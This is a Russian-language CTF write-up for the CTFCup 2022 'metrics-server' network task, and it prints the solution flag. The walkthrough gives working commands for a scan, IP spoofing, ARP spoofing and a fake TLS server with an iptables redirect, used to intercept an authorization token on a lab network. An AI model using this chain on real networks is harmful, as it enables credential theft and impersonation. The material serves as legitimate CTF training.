# CTFCup 2022 | Battles / Main | Network

## Название

> metrics-server

## Описание

> Ха-ха, разработчик забыл заблокировать компьютер, теперь у нас есть VPN-конфиг с доступом в корпоративную сеть. Вытащи из нее все, что сможешь.

## Раздатка
> WARNING! Каждой команде отдельный конфиг!
> 
> После деплоя сервиса необходимо установить IP адреса в конфигах вместо OVPN_SERVER_IP

Первой команде:
* [public/team1-client.ovpn](public/team1-client.ovpn)

Второй команде:
* [public/team2-client.ovpn](public/team2-client.ovpn)

## Деплой

```
docker-compose -f docker-compose.team<1/2>.yaml up --build -d
```

## Решение
Подключаемся к сети с помощью VPN-конфига.

После подключения видно в маршрутах, что стала доступна сеть 10.13.37.0/24. 
```
10.13.37.0/24 dev tap0 proto kernel scope link src 10.13.37.100
```

Попробуем просканировать NMAP'ом.
```bash
> nmap 10.13.37.0/24
Nmap scan report for 10.13.37.10
Host is up (0.66s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT    STATE SERVICE
443/tcp open  https

Nmap scan report for 10.13.37.13
Host is up (0.72s latency).
All 1000 scanned ports on 10.13.37.13 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)

# наш хост, с которого произведено подключение к сети
Nmap scan report for 10.13.37.100
Host is up (0.00026s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
```

В сети подключено два хоста, на одном из которых открыт порт 443.
Попробуем подключиться.
```bash
> curl -XGET https://10.13.37.10/
curl: (60) SSL certificate problem: self-signed certificate
```
Видим, что SSL-сертификаты самоподписаные, потому отключим проверку подлинности сертификатов и отправим запрос еще раз.

```bash
# -k -- для отключения проверки сертификатов
# -i -- для отображения статус кода ответа и хэдеров
> curl -XGET -k -i https://10.13.37.10
HTTP/2 200
content-type: text/html; charset=utf-8
content-length: 156
date: 

<html>
<head><title>Metrics Exporter</title></head>
<body>
<h1>Metrics Exporter</h1>
<p><a href="/metrics">Metrics</a></p>
</body>
</html>
```

Перейдем по указанному пути.
```bash
> curl -XGET -k -i https://10.13.37.10/metrics
HTTP/2 401
content-type: text/plain; charset=utf-8
x-content-type-options: nosniff
content-length: 13
date: 

Incorrect IP
```

Очевидно, что на сервере стоит проверка на IP-адрес.
Можно попробовать перебрать все IP-адреса, отправляя запросы на сервер.
Однако, мы будем исходить из предположения, что допустимый IP-адрес - это адрес второго хоста в сети.

Попробуем подменить.
```bash
# Удаляем текущий адрес с интерфейса тунеля
> sudo ip a del 10.13.37.100 dev tap0
# Устанавливаем новый адрес для интерфейса тунеля
> sudo ip a add 10.13.37.13/24 dev tap0
# В результате должно появиться что-то похожее
> ip -c a
...
11: tap0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
    link/ether <HIDDEN> brd ff:ff:ff:ff:ff:ff
    inet 10.13.37.13/24 scope global tap0
       valid_lft forever preferred_lft forever
...
```
После смены IP-адреса попробуем отправить запрос вновь.
```bash
> curl -XGET -k -i https://10.13.37.10/metrics
HTTP/2 401
content-type: text/plain; charset=utf-8
x-content-type-options: nosniff
content-length: 18
date: Tue, 06 Dec 2022 12:49:40 GMT

User unauthorized
```

Тело ответа изменилось значит мы на правильном пути.

На данном этапе необходимо пройти процедуру авторизации.

Сервер `10.13.37.10` - сервер с метриками, значит, вероятнее всего, второй хост `10.13.37.13` производит сбор этих метрик.

Чтобы узнать, как второй хост проходит процедуру авторизации, необходимо произвести перехват трафика с этого хоста.

Для этого отлично подойдет атака ARP-spoofing. 

```bash
# Восстановим наш IP-адрес к изначальному виду
sudo ip a del 10.13.37.13 dev tap0
sudo ip a addd 10.13.37.100/24 dev tap0

# Производим отравление ARP-кэша хоста 10.13.37.13

sudo arpspoof -i tap0 -t 10.13.37.13 10.13.37.10
```

Траффик должен пойти с хоста 10.13.37.13 на наш. Убедиться можно, запустив `tcpdump`.
```bash
> sudo tcpdump -A -s 0 'tcp port 443' -i tap0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tap0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
13:09:39.930776 IP 10.13.37.13.44736 > 10.13.37.10.https: Flags [.], ack 1516291322, win 501, options [nop,nop,TS val 655982594 ecr 576236342], length 0
E..4..@.@...
.%
.%
....S6
.Z`......t......
'..."X.6
...
```

Действительно, хост `10.13.37.13` отправляет запросы на HTTPS-порт хоста `10.13.37.10`.

Однако, никакой полезной информации мы не видим из-за того, что в запросе происходит попытка установления безопасного соединения.

Вспомним, что сертификаты на сервере самоподписанные, и попробуем поднять собственный HTTPS-сервер с самоподписаными сертификатами.
```bash
# Сгенерируем приватный ключ...
> openssl genrsa -out server.key 2048
# и сам сертификат
> openssl req -new -x509 -sha256 -key server.key -out server.crt -days 3650
```

В качестве сервера можно использовать все, что угодно, например nginx или самописный на python. Пример кода ниже.
```python
# server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class S(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"GET request,\nPath: {self.path}\nHeaders:\n{self.headers}\n")
        return


httpd = HTTPServer(('0.0.0.0', 9999), S)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="server.key",
        certfile='server.crt', server_side=True)

httpd.serve_forever()
```

А также завернем входящий трафик на порт нашего HTTPS-сервера с помощью правила `iptables`.
```bash
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 9999
```

Запускаем сервер.
```bash
> python3 server.py
GET request,
Path: /metrics
Headers:
Host: 10.13.37.10
User-Agent: Go-http-client/1.1
Authorization: 923fefaa07cb4998e53dbfac84b50aeb
Accept-Encoding: gzip

...
```
Спустя небольшой промежуток времени наш сервер логирует запрос от хоста `10.13.37.13` с авторизационным заголовком.

Теперь, повторив действия с изменением IP-адреса, отправим запрос на сервер метрик с полученным заголовком.
```bash
> sudo ip a del 10.13.37.100 dev tap0
> sudo ip a add 10.13.37.13/24 dev tap0
> curl -XGET -k -i -H "Authorization: 923fefaa07cb4998e53dbfac84b50aeb" https://10.13.37.10/metrics
HTTP/2 200
content-type: text/plain; charset=utf-8
content-length: 198
date: Tue, 06 Dec 2022 13:42:38 GMT

metric_PmBBM 0.721790
metric_BvnKu 0.218076
Cup{m17m_15_50_51mp13_bd93321786df} 0.743844
metric_wcSTE 0.455354
metric_pySrl 0.917658
metric_DWkWt 0.543383
metric_RYUsv 0.104970
metric_HGvkV 0.830698
```

Видим наш флаг, сдаем.

Аналогично можно решить задание с помощью прокси-сервера nginx, однако важно помнить про необходимость подмены IP-адреса.

Пример конфига nginx для проксирования запросов на сервер метрик.
```
events {
    use           epoll;
    worker_connections  128;
}

http {
	server {
        listen 9999 ssl http2;
        server_name 10.13.37.10;
        ssl_certificate /etc/nginx/ssl/server.crt;
        ssl_certificate_key /etc/nginx/ssl/server.key;
        access_log /var/log/nginx/access-server.log;
        location / {
        	proxy_pass https://10.13.37.10;
  	    }
	}
}
```

## Флаг

```
Cup{m17m_15_50_51mp13_bd93321786df}
```
